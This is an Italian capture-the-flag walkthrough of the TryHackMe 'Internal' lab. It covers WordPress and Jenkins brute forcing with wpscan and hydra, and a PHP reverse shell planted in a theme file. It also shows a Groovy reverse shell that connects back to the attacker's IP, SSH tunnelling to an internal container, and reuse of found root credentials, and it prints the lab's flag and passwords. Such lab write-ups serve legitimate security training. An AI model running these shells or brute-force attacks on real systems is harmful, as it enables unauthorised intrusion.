
https://tryhackme.com/room/internal


Ti è stato assegnato un cliente che desidera che venga eseguito un penetration test su un ambiente che dovrà essere rilasciato in produzione tra tre settimane. 

**Ambito di lavoro**

Il cliente richiede che un ingegnere effettui una valutazione esterna, tramite app web e interna dell'ambiente virtuale fornito. Il cliente ha richiesto che vengano fornite informazioni minime sulla valutazione, desiderando che l'attività venga condotta sotto gli occhi di un malintenzionato (test di penetrazione black box). Il cliente ha richiesto di ottenere due flag (nessuna ubicazione specificata) come prova di sfruttamento:

- Utente.txt
- Root.txt  
    

Inoltre, il cliente ha fornito le seguenti indennità di ambito:

- Assicurati di modificare il tuo file hosts per riflettere internal.thm
- In questo impegno sono consentiti tutti gli strumenti o le tecniche
- Individuare e annotare tutte le vulnerabilità trovate
- Invia i flag scoperti alla dashboard
- Solo l'indirizzo IP assegnato alla tua macchina è nell'ambito

```
echo "10.10.79.78   internal.thm" >> /etc/hosts
```
inseriamo internal.thm nel file hosts ed effettuiamo una prima scansione con nmap
```
nmap -Pn -v -O -p- internal.thm
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
```

```
nmap -sVC -v  -p22,80 internal.thm
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

ora vediamo cosa abbiamo su
```
http://internal.thm
```

Abbiamo un Apache2 web server come già visto con nmap

facciamo una rapida enumerazione 
```
gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt -t50
```
```
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://internal.thm
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/blog                 (Status: 301) [Size: 311] [--> http://internal.thm/blog/]
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10918]
/javascript           (Status: 301) [Size: 317] [--> http://internal.thm/javascript/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://internal.thm/phpmyadmin/]
/server-status        (Status: 403) [Size: 277]
/wordpress            (Status: 301) [Size: 316] [--> http://internal.thm/wordpress/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished

```
diamo prima un rapido sguardo a ciò che abbiamo trovato
```
http://internal.thm/blog/
```
	qui abbiamo un pagina di blog
ci salta subito all'occhio un collegamento ad una pagina di login
```
http://internal.thm/blog/wp-login.php
```
poi guardiamo
```
http://internal.thm/javascript/
```
	qui non abbiamo accesso a questa risorsa
```
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at internal.thm Port 80</address>
</body></html>
```

```
http://internal.thm/phpmyadmin/
```
	qui abbiamo un form di login

```
http://internal.thm/wordpress/
```
	qui abbiamo una pagina con scritto Oops! That page can’t be found.

dopo un rapido sguardo cerchiamo qualcosa di utile

intanto vediamo con quale versione di WordPress abbiamo a che fare

```
whatweb http://internal.thm/blog/
```
```
└─# whatweb http://internal.thm/blog/
http://internal.thm/blog/ [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.79.78], JQuery, MetaGenerator[WordPress 5.4.2], PoweredBy[WordPress], Script, Title[Internal &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[5.4.2]

```

WordPress[5.4.2]

prima di vedere se ci sono exploit facciamo una rapida enumerazione con wpscan

```
wpscan --url http://internal.thm/wordpress/ -e
```
```
+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/wordpress/wp-content/themes/twentyseventeen/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://internal.thm/wordpress/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.9

```
```
[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Login Error Messages (Aggressive Detection)


```
oltre a plugin di vecchie versioni abbiamo individuato un utente di nome admin

possiamo provare un bruteforce nel tentativo di trovare una password valida con il dizionario rockyou.txt

```
wpscan --url http://internal.thm/wordpress -U admin -P /usr/share/wordlists/rockyou.txt
```

siamo stati fortunati abbiamo trovato subito una password
```
[!] Valid Combinations Found:
 | Username: admin, Password: my2boys
```

ritorniamo alla finestra di login
```
http://internal.thm/blog/wp-login.php
```
```
admin
```
```
my2boys
```

Ora che siamo dentro possiamo sfruttare la vulnerabilità di twentyseventeen precedentemente individuata con wpscan

Andiamo sul Editor dei temi e modifichiamo la pagina 404.php in modo che esegua una reverse shell

sostituiamo il codice con quello trovato su
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
ricordandoci di immettere il nostro ip e la porta che vogliamo utilizzare ed eseguiamo Update file

```
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.14.99.134';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
```

successivamente ci mettiamo in ascolto sulla nostra macchina attaccante

```
nc -lvnp 1234
```

ora visitiamo la pagina che non trovava risorse
```
http://internal.thm/wordpress/
```
oppure
```
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```

ed otteniamo la nostra reverse shell

```
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 1234            
listening on [any] 1234 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.79.78] 43650
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 09:39:46 up  1:39,  0 users,  load average: 0.00, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 

```
ora stabilizziamo il terminale ottenuto
```
python --version
```
	verificare se è presente python
possiamo stabilizzare con
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
	trattamento console tramite python
ora navighiamo tra de directory 
```
www-data@internal:/$ cd home 
cd home
www-data@internal:/home$ ls -al
ls -al
total 12
drwxr-xr-x  3 root      root      4096 Aug  3  2020 .
drwxr-xr-x 24 root      root      4096 Aug  3  2020 ..
drwx------  7 aubreanna aubreanna 4096 Aug  3  2020 aubreanna

```
scopriamo esistenza di un utente di nome aubreanna

```
www-data@internal:/home$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
www-data@internal:/home$ 
```
che è presente anche nel file passwd come unico non di sistema

ora per accedervi serve una password!

Cerchiamo se "aubreanna" è presente nel nome di un file:
```
find / -name "*aubreanna*" 2>/dev/null
```
Cerchiamo se "pincopalla" è presente come contenuto di un file:
```
grep -r "aubreanna" / 2>/dev/null
```
```
www-data@internal:/home$ grep -r "aubreanna" / 2>/dev/null
grep -r "aubreanna" / 2>/dev/null
/opt/wp-save.txt:aubreanna:bubb13guM!@#123
```
fantastico c'è qualcosa nel file wp-save.txt

```
cat /opt/wp-save.txt
```

```
www-data@internal:/$ cat /opt/wp-save.txt
cat /opt/wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123

```

è la password che cercavamo per effettuare il **movimento laterale**

```
su aubreanna
```
```
bubb13guM!@#123
```
ora navighiamo fino ad ottenere la nostra flag
```
aubreanna@internal:/home$ cd aubreanna
cd aubreanna
aubreanna@internal:~$ ls -al
ls -al
total 56
drwx------ 7 aubreanna aubreanna 4096 Aug  3  2020 .
drwxr-xr-x 3 root      root      4096 Aug  3  2020 ..
-rwx------ 1 aubreanna aubreanna    7 Aug  3  2020 .bash_history
-rwx------ 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
-rwx------ 1 aubreanna aubreanna 3771 Apr  4  2018 .bashrc
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .cache
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .gnupg
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .local
-rwx------ 1 root      root       223 Aug  3  2020 .mysql_history
-rwx------ 1 aubreanna aubreanna  807 Apr  4  2018 .profile
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .ssh
-rwx------ 1 aubreanna aubreanna    0 Aug  3  2020 .sudo_as_admin_successful
-rwx------ 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 snap
-rwx------ 1 aubreanna aubreanna   21 Aug  3  2020 user.txt

```

```
cat user.txt
```
ecco la flag user!
```
aubreanna@internal:~$ cat user.txt
cat user.txt
THM{int3rna1_fl4g_1}
```

```
id
```

```
aubreanna@internal:~$ id
id
uid=1000(aubreanna) gid=1000(aubreanna) groups=1000(aubreanna),4(adm),24(cdrom),30(dip),46(plugdev)
aubreanna@internal:~$ sudo -l
sudo -l
[sudo] password for aubreanna: bubb13guM!@#123

Sorry, user aubreanna may not run sudo on internal.
```
Ora vediamo come elevare i nostri privilegi

cerchiamo se possiamo sfruttare qualche file con permessi suid
```
find / -perm -u=s -type f 2>/dev/null
```

```
/bin/mount
/bin/umount
/bin/ping
/bin/fusermount
/bin/su
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
/usr/bin/pkexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

https://gtfobins.github.io/gtfobins/sudo/#sudo

```
aubreanna@internal:~$ sudo sudo /bin/sh
sudo sudo /bin/sh
[sudo] password for aubreanna: bubb13guM!@#123

aubreanna is not in the sudoers file.  This incident will be reported.
```
non troviamo niente di utile ,ma quando si effettuano delle prove di scalata dei privilegi appare un messaggio che indica che la cosa sarà segnalata!

vediamo che servizi attivi ci sono
```
systemctl list-units --type=service
```

```
aubreanna@internal:~$ systemctl list-units --type=service
systemctl list-units --type=service
UNIT                            LOAD   ACTIVE SUB     DESCRIPTION              
accounts-daemon.service         loaded active running Accounts Service         
apache2.service                 loaded active running The Apache HTTP Server   
apparmor.service                loaded active exited  AppArmor initialization  
apport.service                  loaded active exited  LSB: automatic crash report generation
atd.service                     loaded active running Deferred execution scheduler
blk-availability.service        loaded active exited  Availability of block devices
cloud-config.service            loaded active exited  Apply the settings specified in cloud-config
cloud-final.service             loaded active exited  Execute cloud user/final scripts
cloud-init-local.service        loaded active exited  Initial cloud-init job (pre-networking)
cloud-init.service              loaded active exited  Initial cloud-init job (metadata service crawler)
console-setup.service           loaded active exited  Set console font and keymap
containerd.service              loaded active running containerd container runtime
cron.service                    loaded active running Regular background program processing daemon
dbus.service                    loaded active running D-Bus System Message Bus 
docker.service                  loaded active running Docker Application Container Engine
ebtables.service                loaded active exited  ebtables ruleset management
getty@tty1.service              loaded active running Getty on tty1            
grub-common.service             loaded active exited  LSB: Record successful boot for GRUB
keyboard-setup.service          loaded active exited  Set the console keyboard layout
kmod-static-nodes.service       loaded active exited  Create list of required static device nodes for the current kernel
lvm2-lvmetad.service            loaded active running LVM2 metadata daemon     
lvm2-monitor.service            loaded active exited  Monitoring of LVM2 mirrors, snapshots etc. using dmeventd or progress polling
lvm2-pvscan@202:3.service       loaded active exited  LVM2 PV scan on device 202:3
lxcfs.service                   loaded active running FUSE filesystem for LXC  
lxd-containers.service          loaded active exited  LXD - container startup/shutdown
mysql.service                   loaded active running MySQL Community Server   
networkd-dispatcher.service     loaded active running Dispatcher daemon for systemd-networkd
polkit.service                  loaded active running Authorization Manager    
rsyslog.service                 loaded active running System Logging Service   
serial-getty@ttyS0.service      loaded active running Serial Getty on ttyS0    
setvtrgb.service                loaded active exited  Set console scheme       
snapd.apparmor.service          loaded active exited  Load AppArmor profiles managed internally by snapd
snapd.seeded.service            loaded active exited  Wait until snapd is fully seeded
snapd.service                   loaded active running Snap Daemon              
ssh.service                     loaded active running OpenBSD Secure Shell server
systemd-journal-flush.service   loaded active exited  Flush Journal to Persistent Storage
systemd-journald.service        loaded active running Journal Service          
systemd-logind.service          loaded active running Login Service            
systemd-modules-load.service    loaded active exited  Load Kernel Modules      
systemd-networkd-wait-online.service loaded active exited  Wait for Network to be Configured
systemd-networkd.service        loaded active running Network Service          
systemd-random-seed.service     loaded active exited  Load/Save Random Seed    
systemd-remount-fs.service      loaded active exited  Remount Root and Kernel File Systems
systemd-resolved.service        loaded active running Network Name Resolution  
systemd-sysctl.service          loaded active exited  Apply Kernel Variables   
systemd-timesyncd.service       loaded active running Network Time Synchronization
systemd-tmpfiles-setup-dev.service loaded active exited  Create Static Device Nodes in /dev
systemd-tmpfiles-setup.service  loaded active exited  Create Volatile Files and Directories
systemd-udev-trigger.service    loaded active exited  udev Coldplug all Devices
systemd-udevd.service           loaded active running udev Kernel Device Manager
systemd-update-utmp.service     loaded active exited  Update UTMP about System Boot/Shutdown
systemd-user-sessions.service   loaded active exited  Permit User Sessions     
ubuntu-fan.service              loaded active exited  Ubuntu FAN network setup 
ufw.service                     loaded active exited  Uncomplicated firewall   
unattended-upgrades.service     loaded active running Unattended Upgrades Shutdown
user@1000.service               loaded active running User Manager for UID 1000

LOAD   = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB    = The low-level unit activation state, values depend on unit type.

56 loaded units listed. Pass --all to see loaded but inactive units, too.
To show all installed unit files use 'systemctl list-unit-files'.
aubreanna@internal:~$ systemctl status jenkins
systemctl status jenkins
Unit jenkins.service could not be found.
aubreanna@internal:~$ 

```

troviamo interessante un docker in esecuzione

```
systemctl status docker
```

```
aubreanna@internal:~$ systemctl status docker
systemctl status docker
● docker.service - Docker Application Container Engine
   Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled)
   Active: active (running) since Wed 2025-09-24 08:00:25 UTC; 2h 33min ago
     Docs: https://docs.docker.com
 Main PID: 909 (dockerd)
    Tasks: 15
   CGroup: /system.slice/docker.service
           ├─ 909 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/cont…ck
           └─1493 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-p…80

Sep 24 08:00:24 internal dockerd[909]: time="2025-09-24T08:00:24.773660516Z…mit"
Sep 24 08:00:24 internal dockerd[909]: time="2025-09-24T08:00:24.773908634Z…iod"
Sep 24 08:00:24 internal dockerd[909]: time="2025-09-24T08:00:24.773918811Z…ime"
Sep 24 08:00:24 internal dockerd[909]: time="2025-09-24T08:00:24.774174472Z…rt."
Sep 24 08:00:25 internal dockerd[909]: time="2025-09-24T08:00:25.091103330Z…ess"
Sep 24 08:00:25 internal dockerd[909]: time="2025-09-24T08:00:25.811136988Z…ne."
Sep 24 08:00:25 internal dockerd[909]: time="2025-09-24T08:00:25.861710039Z…03.6
Sep 24 08:00:25 internal dockerd[909]: time="2025-09-24T08:00:25.862378771Z…ion"
Sep 24 08:00:25 internal systemd[1]: Started Docker Application Container E…ine.
Sep 24 08:00:25 internal dockerd[909]: time="2025-09-24T08:00:25.905673390Z…ock"
Hint: Some lines were ellipsized, use -l to show in full.
aubreanna@internal:~$ 

```
diamo uno sguardo alla rete
```
ifconfig
```
```
aubreanna@internal:~$ ifconfig
ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:30ff:fee8:9670  prefixlen 64  scopeid 0x20<link>
        ether 02:42:30:e8:96:70  txqueuelen 0  (Ethernet)
        RX packets 8  bytes 420 (420.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1515 (1.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
abbiamo in esecuzione un servizio su IP di rete differente 172.17.0.1
```
arp -a
```
```
arp -a
ip-10-10-182-71.eu-west-1.compute.internal (10.10.182.71) at 02:ab:74:d4:ed:29 [ether] on eth0
ip-10-10-0-1.eu-west-1.compute.internal (10.10.0.1) at 02:c8:85:b5:5a:aa [ether] on eth0
ip-172-17-0-2.eu-west-1.compute.internal (172.17.0.2) at 02:42:ac:11:00:02 [ether] on docker0

```
nell'intenzione di andare a veder il contenuto del file hosts 
```
ls -al
```
```
-rwx------ 1 aubreanna aubreanna    7 Aug  3  2020 .bash_history
-rwx------ 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
-rwx------ 1 aubreanna aubreanna 3771 Apr  4  2018 .bashrc
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .cache
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .gnupg
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .local
-rwx------ 1 root      root       223 Aug  3  2020 .mysql_history
-rwx------ 1 aubreanna aubreanna  807 Apr  4  2018 .profile
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .ssh
-rwx------ 1 aubreanna aubreanna    0 Aug  3  2020 .sudo_as_admin_successful
-rwx------ 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 snap
-rwx------ 1 aubreanna aubreanna   21 Aug  3  2020 user.txt
```
noto qualcosa che mi è sfuggita precedentemente!
```
cat jenkins.txt
```
```
aubreanna@internal:~$ cat jenkins.txt
cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```
a conferma di quello che stavo cercando!

Ora bisogna effettuare un Pivoting per poterci collegare dal nostro browser direttamente al servizio interno
lo facciamo in questo caso tramite ssh perchè dovrebbe essere più semplice 

Dopo aver provato Pivoting con SSH e ProxyChains senza successo ho deciso di effettuare la cosa più semplice

**Creiamo un Tunnel SSH con Port Forwarding**
Pussiamo creare un tunnel SSH che inoltra il traffico dalla tua macchina locale a `172.17.0.2:8080`. In questa maniera
```
ssh -L 8081:172.17.0.2:8080 aubreanna@internal.thm -p 22
```
```
bubb13guM!@#123
```
ora accediamo al servizio andando dal nostro browser su
```
http://localhost:8081
```

C'è una pagina di login con scritto "Benvenuto in Jenkins!"

Sapendo che l'utente è admin proviamo ad effettuare un Brute Force nella speranza di trovare un modo per elevare successivamente i privilegi

Catturiamo la richiesta con Burp Suite 
```
POST /j_acegi_security_check HTTP/1.1
Host: localhost:8081
User-Agent: J
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8081/login?from=%2F
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://localhost:8081
Connection: keep-alive
Cookie: JSESSIONID.c8f8f65f=node01qxuzi9mik0on1d7bqd0593xgx1.node0
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

j_username=admin&j_password=123456&from=%2F&Submit=Accedi
```
e creiamo il comando da dare in pasto ad hydra
```
hydra localhost -s 8081 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt
```
dopo un poco di attesa otteniamo
```
[ATTEMPT] target localhost - login "admin" - pass "12345678910" - 433 of 14344399 [child 9] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "leonardo" - 434 of 14344399 [child 14] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "jayjay" - 435 of 14344399 [child 7] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "liliana" - 436 of 14344399 [child 4] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "dexter" - 437 of 14344399 [child 15] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "sexygirl" - 438 of 14344399 [child 2] (0/0)
[ATTEMPT] target localhost - login "admin" - pass "232323" - 439 of 14344399 [child 13] (0/0)
[8081][http-post-form] host: localhost   login: admin   password: spongebob
[STATUS] attack finished for localhost (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```
```
login: admin   password: spongebob
```

ci logghiamo e siamo dentro!
Ora cerchiamo se è possibile in qualche maniera ottenere una reverse shell

Nella sezione **Console script** abbiamo l'opportunità di eseguire comandi
ci mettiamo prima in ascolto sul nostro pc

```
nc -lvnp 5555
```
ed inviamo questo script dalla console di Jenkins
```groovy
String host="10.14.99.134";
int port=5555;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

ed otteniamo la reverse shell
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 5556
listening on [any] 5556 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.155.113] 34840
pwd
/
whoami
jenkins
ls -al
total 84
drwxr-xr-x   1 root root 4096 Aug  3  2020 .
drwxr-xr-x   1 root root 4096 Aug  3  2020 ..
-rwxr-xr-x   1 root root    0 Aug  3  2020 .dockerenv
drwxr-xr-x   1 root root 4096 Aug  3  2020 bin
drwxr-xr-x   2 root root 4096 Sep  8  2019 boot
drwxr-xr-x   5 root root  340 Sep 24 15:05 dev
drwxr-xr-x   1 root root 4096 Aug  3  2020 etc
drwxr-xr-x   2 root root 4096 Sep  8  2019 home
drwxr-xr-x   1 root root 4096 Jan 30  2020 lib
drwxr-xr-x   2 root root 4096 Jan 30  2020 lib64
drwxr-xr-x   2 root root 4096 Jan 30  2020 media
drwxr-xr-x   2 root root 4096 Jan 30  2020 mnt
drwxr-xr-x   1 root root 4096 Aug  3  2020 opt
dr-xr-xr-x 121 root root    0 Sep 24 15:05 proc
drwx------   1 root root 4096 Aug  3  2020 root
drwxr-xr-x   3 root root 4096 Jan 30  2020 run
drwxr-xr-x   1 root root 4096 Jul 28  2020 sbin

```
la stabilizziamo
```
python -c 'import pty;pty.spawn("/bin/bash")'
```


dopo una lunga ricerca troviamo in `/opt` il file `note.txt` che contiene...

```
jenkins@jenkins:/$ cd /opt
cd /opt
jenkins@jenkins:/opt$ ls
ls
note.txt
jenkins@jenkins:/opt$ cat note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
jenkins@jenkins:/opt$
```

```
su
```

```
tr0ub13guM!@#123
```
e finalmente troviamo la flag di root!
```
Internal Jenkins service is running on 172.17.0.2:8080
root@internal:/home/aubreanna# cd ..
root@internal:/home# cd ..
root@internal:/# cd root
root@internal:~# ls
root.txt  snap
root@internal:~# cat root.txt
THM{xxxxxxxxx}
```

```
ps aux | grep ssh
kill 1234

